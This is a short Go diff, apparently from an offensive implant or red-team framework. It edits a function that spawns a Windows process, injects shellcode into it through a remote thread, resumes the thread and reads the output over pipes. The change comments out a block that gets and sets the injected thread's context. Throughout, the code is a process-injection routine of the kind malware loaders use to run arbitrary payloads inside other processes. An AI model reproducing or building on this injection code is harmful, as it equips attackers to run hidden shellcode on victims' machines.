@@ -79,12 +79,12 @@ func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
 	windows.CloseHandle(windows.Handle(hChildStdoutWrite))
 	windows.CloseHandle(windows.Handle(hChildStdinRead))
 	pidStr := strconv.Itoa(int(pi.ProcessId))
-	hThread, threadStart, err := RemoteInjectReturnThread(shellcode, pidStr)
+	hThread, _, err := RemoteInjectReturnThread(shellcode, pidStr)
 	if err != nil {
 		return "", err
 	}
 	// get thread context
-	ctx := winapi.CONTEXT{}
+	/*ctx := winapi.CONTEXT{}
 	ctx.ContextFlags = winapi.CONTEXT_INTEGER
 	err = winapi.GetThreadContext(uintptr(hThread), &ctx)
 	if err != nil {
@@ -96,6 +96,7 @@ func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
 	if err != nil {
 		return "", err
 	}
+	*/
 	windows.ResumeThread(windows.Handle(hThread))
 	// now we wait for our thread to finish then send a
 	var exitCode uint32
